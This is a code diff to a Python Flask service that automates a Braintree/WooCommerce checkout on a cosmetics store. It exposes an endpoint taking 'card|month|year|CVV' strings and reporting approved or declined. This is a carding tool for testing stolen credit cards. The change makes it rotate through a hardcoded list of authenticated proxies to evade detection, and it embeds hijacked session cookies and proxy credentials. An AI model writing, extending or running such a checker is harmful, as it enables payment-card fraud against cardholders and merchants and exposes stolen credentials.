@@ -3,42 +3,38 @@ import re
 import json
 import uuid
 from time import sleep
-import random
 from flask import Flask, request
+from itertools import cycle
 
 app = Flask(__name__)
 
 proxies_list = [
-    '142.111.48.253:7030:fvbysspi:bsbh3trstb1c',
-    '31.59.20.176:6754:fvbysspi:bsbh3trstb1c',
-    '38.170.176.177:5572:fvbysspi:bsbh3trstb1c',
-    '198.23.239.134:6540:fvbysspi:bsbh3trstb1c',
-    '45.38.107.97:6014:fvbysspi:bsbh3trstb1c',
-    '107.172.163.27:6543:fvbysspi:bsbh3trstb1c',
-    '64.137.96.74:6641:fvbysspi:bsbh3trstb1c',
-    '216.10.27.159:6837:fvbysspi:bsbh3trstb1c',
-    '142.111.67.146:5611:fvbysspi:bsbh3trstb1c',
-    '142.147.128.93:6593:fvbysspi:bsbh3trstb1c'
+    "142.111.48.253:7030:fvbysspi:bsbh3trstb1c",
+    "31.59.20.176:6754:fvbysspi:bsbh3trstb1c",
+    "38.170.176.177:5572:fvbysspi:bsbh3trstb1c",
+    "198.23.239.134:6540:fvbysspi:bsbh3trstb1c",
+    "45.38.107.97:6014:fvbysspi:bsbh3trstb1c",
+    "107.172.163.27:6543:fvbysspi:bsbh3trstb1c",
+    "64.137.96.74:6641:fvbysspi:bsbh3trstb1c",
+    "216.10.27.159:6837:fvbysspi:bsbh3trstb1c",
+    "142.111.67.146:5611:fvbysspi:bsbh3trstb1c",
+    "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 ]
 
+proxies_cycle = cycle(proxies_list)
+
 class EcosmeticsPayment:
-    def __init__(self):
-        proxy = random.choice(proxies_list)
-        parts = proxy.split(':')
-        ip, port, user, pw = parts
-        proxy_url = f"http://{user}:{pw}@{ip}:{port}"
-        self.proxies = {"http": proxy_url, "https": proxy_url}
-        
+    def __init__(self, proxy=None):
         self.session = requests.Session()
-        self.session.proxies.update(self.proxies)
-        
+        if proxy:
+            self.session.proxies.update({'http': proxy, 'https': proxy})
         self.cookies = {
             '_gcl_au': '1.1.472509716.1760778293',
             '_ga': 'GA1.1.260355234.1760778309',
             '__pr.d1zjip': '8r_agKnn9d',
             '_fbp': 'fb.1.1760778312473.662763495889949214',
             'cdn.ecosmeticsinc.101117.ka.ck': '53fa7ee3e97dc47fc0fdb6bff01d3347b1f4205055ba74fa07f143b5af5fdf331ebf0dc6f0e7cbe22f151321497ce5e7b1bf2a0c38217f2d680b51be36cc744bfe8fa687f3c23f9baffee1cccf0e8fe7f8f299a1bdd1c4a48ecab8e4593583f0daed8fb02e73d1f9f2418838f9731425fd22202760a067550d53f4265b0a5e29ad7fd9a60593354a92532bc7eeb9a9e4bedfc863b55e5e488c7bba',
-            '__kla_id': 'JTdCJTIyZW1haWwlMjIlM0AlMjJ4Y3JhY2tlcjEwJTQwZ21haWwuY29tJTIyJTJDJTIyZmlyc3RfbmFtZSUyMiUzQSUyMkpvaG4lMjIlMkMlMjJsYXN0X25hbWUlMjIlM0ElMjJTbWl0aCUyMiU3RA==',
+            '__kla_id': 'JTdCJTIyZW1haWwlMjIlM0ElMjJ4Y3JhY2tlcjEwJTQwZ21haWwuY29tJTIyJTJDJTIyZmlyc3RfbmFtZSUyMiUzQSUyMkpvaG4lMjIlMkMlMjJsYXN0X25hbWUlMjIlM0ElMjJTbWl0aCUyMiU3RA==',
             'wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220': 'john.smith-5615%7C1761988602%7CIKVPCr9eY6nRF12P8MX2yCQvbKWKAhNgpzJ9WIDhT7k%7Cfef4f7a586ba1e412ef9cb33688723e5c2e2df2dfaf91eb700765c6491bac72e',
             'wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220': '9732510%7C1760951083%7C1760864683%7C%24generic%24RBilklGuEDlklAh3dPeHeDzvjieZFKrZD40LZfxu',
             'woocommerce_recently_viewed': '4340182',
@@ -126,8 +122,7 @@ class EcosmeticsPayment:
                 'https://payments.braintree-api.com/graphql',
                 headers=braintree_headers,
                 json=tokenize_data,
-                timeout=10,
-                proxies=self.proxies
+                timeout=10
             )
             
             if response.status_code != 200:
@@ -162,7 +157,7 @@ class EcosmeticsPayment:
             r'var wc_checkout_params = {[^}]*"nonce":"([^"]+)"',
             r'woocommerce_checkout_params[^}]*"nonce":"([^"]+)"',
         ]
-        
+       
         for pattern in patterns:
             match = re.search(pattern, response.text)
             if match:
@@ -207,6 +202,7 @@ class EcosmeticsPayment:
             return {"status": "Declined", "response": "Payment failed"}
         except Exception:
             return {"status": "Error", "response": "Invalid response"}
+
 
     def process_payment(self, card_number, exp_month, exp_year, cvv):
         try:
@@ -261,22 +257,11 @@ class EcosmeticsPayment:
         except Exception as e:
             return {"status": "Error", "response": f"Processing error"}
 
-@app.route('/gateway=b3charge/cc=', methods=['GET'])
-def handle_request():
-    gateway = request.args.get('gateway')
-    if gateway != 'b3charge':
-        return "Invalid gateway", 400
-    
-    cc_input = request.args.get('cc')
-    if not cc_input:
-        return "Missing cc", 400
-    
-    if '|' not in cc_input:
-        return "Invalid format - Use: cc|mm|yy|CVV or cc|mm|yyyy|CVV", 400
-    
-    parts = cc_input.split('|')
+@app.route('/gateway=b3$/cc=<cc>', methods=['GET'])
+def process_cc(cc):
+    parts = cc.split('|')
     if len(parts) != 4:
-        return "Invalid format - Use: cc|mm|yy|CVV or cc|mm|yyyy|CVV", 400
+        return "Invalid format: Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"
     
     card_number = parts[0].strip()
     exp_month = parts[1].strip()
@@ -285,11 +270,15 @@ def handle_request():
     
     if len(exp_year) == 2:
         exp_year = '20' + exp_year
-        
-    payment = EcosmeticsPayment()
-    result = payment.process_payment(card_number, exp_month, exp_year, cvv)        
+    
+    proxy_str = next(proxies_cycle)
+    ip, port, user, pw = proxy_str.split(':')
+    proxy = f"http://{user}:{pw}@{ip}:{port}"
+    
+    payment = EcosmeticsPayment(proxy)
+    result = payment.process_payment(card_number, exp_month, exp_year, cvv)
     
     return f"{result['status']}|{result['response']}"
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+    app.run(debug=True)
